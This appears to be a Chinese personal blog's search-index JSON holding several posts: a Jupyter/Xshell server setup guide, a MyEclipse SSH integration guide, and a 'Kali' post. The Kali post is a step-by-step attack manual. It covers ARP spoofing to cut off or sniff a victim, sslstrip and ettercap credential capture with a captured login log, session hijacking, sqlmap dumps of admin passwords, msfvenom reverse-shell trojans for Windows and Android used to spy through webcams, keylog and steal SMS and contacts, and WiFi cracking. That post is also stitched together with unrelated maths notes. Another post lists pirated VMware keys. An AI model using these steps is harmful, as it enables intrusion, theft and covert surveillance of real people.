{"pages":[{"title":"tags","text":"","path":"tags/index.html"},{"title":"about","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 关于我鄙人是江西上饶的一位无名小卒，现于上海本科就读，现实生活中比较内向、形单影只，但热衷于各种技术，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌 拿句最近看到的笑语来介绍下： 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 欢迎互加友链，可在文末留言，格式如下： Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gital留言，附上贵站的链接及文章主要分享类别。","path":"about/index.html"},{"title":"categories","text":"","path":"categories/index.html"}],"posts":[{"title":"test","text":"test","path":"2018/11/26/test/"},{"title":"Kali","text":"总共是三台电脑A、B、CB可以pingAC，AC不能pingB，AC可以互ping 3.①：模型变换法对存在异方差性的模型进行适当的变量交换，使之成为满足同方差假定的模型，其前提是合理确定异方差性的具体形式。②：加权最小二乘法（WLS）对原模型进行加权，使之成为一个新的不存在异方差性的模型，然后采用最小二乘法估计其参数③：模型的对数变换对数变换使所测量的变量尺度缩小，进而缩小原变量差异的倍数，对数变换后的模型的残差$e_i$表示相对误差，其比绝对误差有较小的差异，进而降低异方差的影响。 第一个他将区间分为0-$\\frac{1}{2}$和$\\frac{1}{2}$其实只是为了让解答过程更加清晰一些而已，没有实际的意义。你完全可以也可以从$\\frac{1}{3}、\\frac{1}{4}$分开。 第二个同敛散问题你要观察，$\\int_\\frac{1}{2}^1\\frac{\\sqrt[m]{ln^2(1-x)}}{\\sqrt[n]{x}}dx$、$\\int_{\\frac{1}{2}}^1{\\sqrt[m]{ln^2(1-x)}}dx$，第二个积分中的被积函数的分母在这个区间内是一个有界的形式，而分子中的$ln(1-x)$在$x=1$的时候是无界的，所以只考虑分子就行了，他们同敛散。 后面的小于的话你构造一个新的函数然后求导就行了。 Kali渗透一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" —dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录—下载 keyscan_start 键盘记录—开始 keyscan_stop 键盘记录—停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon ```echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db —import essid essid.txtairolib-ng essid_db —statsairolib-ng essid_db —import password ./names.txtairolib-ng essid_db —batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/11/23/Kali/"},{"title":"Xshell远程连接linux并远程访问ipython服务（深度学习环境的搭建）","text":"前言如今，人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的潮流，不被时代所淘汰、out、出局，博主也想打算开始深度学习。而据说如今深度学习最好的环境是Python + Jupyter notebook + Tensorflow了，为此首先需要搭建一个这么个环境，以便开始深度学习之旅。此外，若能搭建一个自己的深度学习服务器再好不过了，所以本文将从以下三个部分的内容进行介绍： 环境准备 Xshell远程连接Ubuntu Jupyter notebook服务器的配置及远程访问 远程环境的测试 OK，话不多说，开始进入正轨吧。(#`O′) 一、环境准备环境介绍 准备两台计算机，一个作为服务端，一个作为客户端。 服务端：Linux系统（Ubuntu）官方介绍：Ubuntu（友帮拓、优般图、乌班图）是一个以桌面应用为主的开源GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的。Linux系统区别于windows系统最大的区别是其主要是利用终端 Shell 命令来进行一系列的操作，所以在实际使用过程中常常用来搭建服务器，该系统搭建在VMware虚拟机中。 客户端：Windows10系统这个大家再熟悉不过了，就不介绍了。 Anaconda官方介绍：Anaconda指的是一个开源的Python发行版本，其包含了conda、Python等180多个科学包及其依赖项。所以说，当我们下载了Anaconda之后就不必要再下载Python其他包了，其内部集成了大量大Python工具，其中就包括我们这篇文章的主角Jupyter notebook。 Xshell这个就没什么好说的了，它主要是一种远程连接的工具，使用它之后我们就可以通过ssh协议来远程连接Ubuntu系统了，而且它常常与远程文件传输工具Xftp配套使用。 软件下载这里给大家两种方式进行下载，一个是官网下载，一个是鄙人的网盘下载，大家根据自己的方便下载即可。 官网： Anaconda：https://www.anaconda.com/download/，于服务端下载 Xshell：https://xshell.en.softonic.com/?ex=BB-682.0，于客户端下载 Ubuntu：https://www.ubuntu.com/download/desktop，于服务端下载 VMware：https://www.ubuntu.com/download/desktop，于服务端下载 网盘： Anaconda：https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ， 密码：1pbs，于服务端下载 Xshell：https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw， 密码：fi0y，于客户端下载 Ubuntu：https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ， 密码：50yw，于服务端下载 VMware：https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww， 密码：hjnq，于服务端下载 VMware下安装Ubuntu注意：以下内容都是在服务端计算机中进行配置 在VMware虚拟机下安装Ubuntu系统虽然有点步骤，但是并不复杂。在综合考虑到时间成本与其给大家带来的价值的关系下，博主就用文字描述了，暂时不贴图了。但是你不必担心，关键步骤还是会贴图说明的 ( ﹁ ﹁ ) ~→。 在服务端下载好VMware及Ubuntu之后。首先打开VMware你会发现他会让你输入VMware秘钥，以下将给出几个目前有效的秘钥，当你使用的时候也许已经失效了，你可以自行百度查找秘钥： 12345FF31K-AHZD1-H8ETZ-8WWEZ-WUUVACV7T2-6WY5Q-48EWP-ZXY7X-QGUWDZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8ZC5XK-A6E0M-080XQ-04ZZG-YF08DZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8 输入秘钥之后 ，进入到了VMware的页面了，为了缩短文章的字数，博主还是使用windows自带的mspaint来绘制一个流程图来为大家介绍下Ubuntu的安装吧，尽量简洁明了： 原本以为制作这个流程图用不了多少时间，结果却用了20分钟，但是如此一来思路清晰、逻辑性强，值了（好吧，不吹自己了，还有很大的提升空间），w(ﾟДﾟ)w。好了，至此Ubuntu就已经安装好了，如果有卡壳的地方可在文章末留言或者左侧的Gitalk留言。 Ubuntu下Anaconda的安装在VMware下安装好Ubuntu后，虽然Ubuntu内自带了Python，但是其版本是2.7的，而且许多常用的包并没用集成，所以我们还需要安装Anaconda。 根据以上Anaconda的下载方式下载Anaconda，进入到其目录之下（或者cd操作），然后打开终端，执行如下命令进行安装：1bash Anaconda3-5.3.1-Linux-x86_64.sh # 不要盲目的复制粘贴，根据自己所下载的Anaconda版本执行 执行之后会有一些列诸如同意协议之类的问题，我们默认即可（直接Enter，或者yes），直到出现Anaconda环境变量配置的显示，我们需要选择将其加入到环境变量中去。一系列操作之后，我们关闭终端然后在重新打开终端，然后在终端分别执行conda list、python命令，如果你的终端界面出现类似以下输出，则恭喜你说明你已经完成了anaconda的安装。 而如果你的终端输错报错（未找到conda命令之类的）或者Python版本为2.7，那就说明你以上操作中未将Anaconda加入到环境变量，所以你需要手动配置Anaconda的环境变量，操作如下：123# 打开环境变量的配置文件，从这里我们就可以看出Linux和Windows下的操作的区别了# windows一般是通过界面的形式进行设置，而Linux下则大多数通过终端并使用vim进行配置sudo vim gedit /root/.bashrc 打开文件之后我们需要在文件末尾添加如下内容1export PATH=\"XXX:$PATH\" # XXX为你的Anaconda的bin目录，例如我的是/home/lxj/anaconda3/bin 然后保存，在终端输入source ~/.bashrc进行更新即可完成Anaconda环境变量的配置，不出意外的话再次分别执行Python、conda list命令之后你会看见正确的输出了。 补充：这里需要说明一下，以上的操作是使用Vim进行文件编辑的，他不同于windows下的记事本等，而是通过特定的操作来对文件进行编辑。对于熟悉Vim操作的应该会理解以上Anaconda环境变量的配置，然而如果是对Vim比较陌生的朋友可能会卡壳，所以在这里简单介绍一些vim的操作。 在终端使用vim命令之后将会进入到vim的界面，此时的界面是不允许modify任何内容的，只允许read only。此时我们输入i将会进入到vim的编辑模式，现在就能对该文件进行修改了。文件内容修改完成之后，我们需要退出该vim编辑模式，vim 的退出常用的有以下几种（首先输入Esc键）： q! -&gt; 不保存文件修改并退出 wq -&gt; 保存文件的修改并退出 wq! -&gt; 有时候我们需要root权限才能编辑文件，使用该命令之后就能够强制修改并退出对于以上Anaconda环境变量的配置，vim的熟悉至此就足够了，但是顺便介绍一下其他常用的命令供大家参考，也是记录一下方便以后的回顾： read模式下双击d -&gt; 删除当行内容 Ctrl+b -&gt; 内容向前移动一页 ctrl+f -&gt; 内容向后移动爷爷 shift+g -&gt; 鼠标指针定位到最后常用的就是以上一些了，其他的操作有需要的话在来看看。 注意：以上内容都是在服务端计算机中进行配置 好了，好了，好了。至此，我们已经完成了环境的搭建，接下来我们将介绍如何使用Xshell远程连接Ubuntu操作，拿好你的小板凳快快做好。 二、Xshell远程连接Ubuntu注意：以下内容都是在客户端计算机中进行配置 安装好Anaconda之后，我们需要通过Xshell使用Xshell来远程连接我们的Ubuntu系统，此时我们的目标需要转移至客户端了。首先在以上软件下载中根据链接下载Xshell，之后Windows傻瓜式安装好Xshell（顺便把Xftp安装下，与Xshell配套使用的，虽然在本文中使用不到）。之后的操作会有几个坑，但是不必担心，博主会带你一个一个的填掉 o(*≧▽≦)ツ┏━┓。 坑一：连接失败我们双击打开Xshell，并点击文件并新建，然后根据如下图进行操作： 补充，上方中的主机属性是填Ubuntu的ip地址，该地址可在Ubuntu的终端执行ifconfig（windows是ipconfig）命令得到。 以上信息填写完之后在出现的界面输入自己Ubuntu下的用户登录密码即可。执行之后你花发现连接失败，此时需要检查一下Ubuntu是否与客户端处于同一网段下，可以将Ubuntu设置成桥接模式（右键Ubuntu虚拟机然后进行设置），之后再次检查一下客户端（Windows10）是否能够ping通服务端（Ubuntu），在客户端的cmd中执行如下：1ping XXX.XXX.XXX.XXX # XXX.XXX.XXX.XXX为服务端的ip 在以上操作之后，一般就能ping通了，如果失败了则在Ubuntu终端下执行sudo wfw disable命令关闭防火墙。 坑二：连接失败 (ノへ￣、) 在如上操作之后，我们再次尝试重新连接。我们可以发现依然连接失败，显示拒绝连接之类的信息。这是因为Xshell是通过ssh协议来连接Ubuntu的，但是Ubuntu默认是没有开启ssh服务的，所以我们需要在其终端执行如下命令来开启ssh服务：1sudo service ssh restart 之后我们再次尝试连接。 坑三：连接失败 (ノへ￣、) (ノへ￣、) 一般来讲，这个时候依然是连接失败，此时我们需要安装在Ubuntu下安装ssh服务，执行以下命令进行安装：1sudo apt-get install openssh-server 待其安装好后，我们再再再次连接Ubunut。 OK，以上坑踩过之后也该连接成功了吧。的确此时你将成功连接到Ubuntu了，之后Xshell将打开一个终端，这个终端就是Ubuntu下的终端了，也就是说我们可以使用该终端控制Ubuntu了，并对其进行Shell操作。ヽ(✿ﾟ▽ﾟ)ノ 三、Jupyter notebook服务器的配置及远程访问由于我们在之前已经安装过了Anaconda，所以此时的Ubuntu就已经集成了ipython as well as （秀一下英语，虽然很烂）jupyter-notebook，对此，将通过Xshell远程连接Ubuntu来搭建Jupyter notebook的服务器，并对其进行远程访问。 在终端中启动ipython或者python，然后执行以下命令12from IPython.lib import passwdpasswd() 上述命令执行之后将会在终端显示设置密码，比如在这我们将密码设置成：123，之后enter并确认即可。 注意：这里的密码是暗文的形式，输入之后不会显示的，还有此时你输入的密码需要记住，因为我们待会远程访问jupyter notebook服务器的时候需要用到该密码进行登录 密码输入之后，我们将会看到有一个较长字符串，该字符串是上述密码的加密形式，我们需要将其复制下来，在之后的ipython_notebook_config.py文件的设置中需要使用，操作结果如下图所示： 随后为了方便上述加密密码字符串的记录，我们在此开启另一个终端（这也是Xshell的方便所在），然后使用如下命令创建一个服务器名，比如，在此我们将该名字设置为：XXX1ipython profile create txj 在上述服务器名创建完成之后，将在终端输出两个py文件（ipython_config.py、ipython_kernel_config.py）路径，之后使用如下cd命令我们进入到.ipython路径1cd .ipython/ 操作图示如下： 进入.ipython目录之后使用ls命令将会列出上述创建的两个py文件所在，但是我们需要再额外创建一个py配置文件并对其进行设置，在这里我们使用vim来进行操作，关于vim的使用，上述的Anaconda环境配置过程中已经介绍了，遗忘的朋友可以返回看一看再熟悉一下。熟悉之后我们完成如下步骤：12cd .ipython/profile_txj # 终端进入.ipython路径vim ipython_notebook_config.py # 使用vim进行创建ipython_notebook_config.py并对其进行编辑 进入到vim环境之后我们在ipython_nnotebook_config.py文件中编辑如下内容：1234567c = get_config()c.IPKernelApp.pyalb = \"inline\"c.NotebookApp.ip = \"*\"c.NotebookApp.open_browser = Falsec.NotebookApp.allow_root = Truec.NotebookApp.password = u\"加密后的密码\" # 这里我们需要使用上述加密后的密码，在另一个终端可见c.NotebookApp.port = 8888 # 在这里，我们需要设置一个jupyter-notebook的端口，尽量设置的少见点，以免造成端口冲突 编辑好后，wq命令保存并退出。 在上述一切操作完成之后，我们现在来开启该服务器，新建一个终端并执行如下命令12jupyter notebook --config=你的ipython_notebook_config.py文件路径 # 例如/home/lxj/.ipython/profile_XXX/ipython_notebook_config.py 在上述命令执行之后，如果出现如下图片所示内容，则说明我们的服务端已经正常启动 在服务端启动完成之后，我们在客户端打开浏览器，访问XXX.XXX.XXX.XXX:8888（ubuntu的ip加开放的端口）试试，看看能否正常请求。如果随后出现一个如上所示的Jupyter notebook的登录页面，那么恭喜你，至此Jupyter notebook服务器配置完成，并能够远程访问了。在表单中输入你所设置的密码（上面第一步设置的密码，123）即可开始你的深度学习之旅了。 以上就是Jupyter notebook服务器的配置及远程访问的内容了，但是能否正常使用requests、numpy、pandas、matplotlib、Tensorflow呢，我们下面将通过几个简单的例子来对其进行测试。 四、远程环境的测试通过上述的操作，我们已经完成了远程操作。但是保险起见，我们对其进行验证，看看anaconda下的第三方包能否正常使用。为此，我们通过以下几个案例来进行验证： 百度及其子链接的简单爬虫（requests， BeautifulSoup） 数据可视化操作（pandas，numpy，matplotlib，skimage） 机器学习之鸢尾花的分类预测（sklearn， numpy） 4.1 简单爬虫123456789101112import requestsfrom bs4 import BeautifulSoupdef get_page(url, headers): return requests.get(url).textif __name__ == \"__main__\": baidu_url = \"https://www.baidu.com\" baidu_soup = BeautifulSoup(get_page(baidu_url), \"lxml\") son_links = [biaoqian_a.attrs[\"href\"] for biaoqian_a in baidu_soup.find_all(\"a\")] for index, son_link in enumerate(son_links): print(\"正在请求第&#123;&#125;个页面\".format(str(index))) print(get_page(son_link)) 4.2 数据可视化123456789101112% matplot inlineimport numpy as npimport pandas as pdfrom amtplotlib import pyplot as pltimport skimagex = np.random.uniform(1, 100, 100)y = np.random.uniform(1, 100, 100)plt.plot(x, y)plt.show()XXXXXXXX 4.3 支持向量机下的鸢尾花的识别1XXXX 总结通过上述的演示，已经完成了windows10下使用xshell远程连接linux系统以及远程访问jupyter-notebook服务，并通过几个小例子来对其进行验证说明可以正常使用linux下的anaconda。虽然msi computer不支持在本机安装linux系统，但是我们依然可以在另一台computer中安装并远程进行访问，而且其中的优势也是显而易见的： 并不像以前那样虚拟机和物理机都在同一台computer中运行，而是将其中一台computer作为linux服务器，然后使用xshell对其进行远程操作，在一定程度上减小其压力。 方便了各个进程之间的管理且易于操作 。。。。。。 2018-09-23,By Zero","path":"2018/09/23/Xshell远程连接linux并远程访问ipython服务/"},{"title":"利用MyEclipse进行SSH项目整合","text":"1. 将Spring与Hibernate进行整合1.1 为项目添加Spring的开发支持 在开发的时候一定要先啊添加Spring而不是Hibernate，如果那样的话就热闹了。 1.1.1 创建一个新的web项目SSHDemo1.1.2 添加Spring configure facets install spring facet next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。 1.2 添加Hibernate configure facets install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的 将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file-&gt; next 打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了 在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish 1.3 将Spring和Hibernate进行整合1.3.1 修改hibernate.cfg.xml文件1234567891011121314&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC \"-//Hibernate/Hibernate Configuration DTD 3.0//EN\" \"http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\"&gt;&lt;!-- Generated by 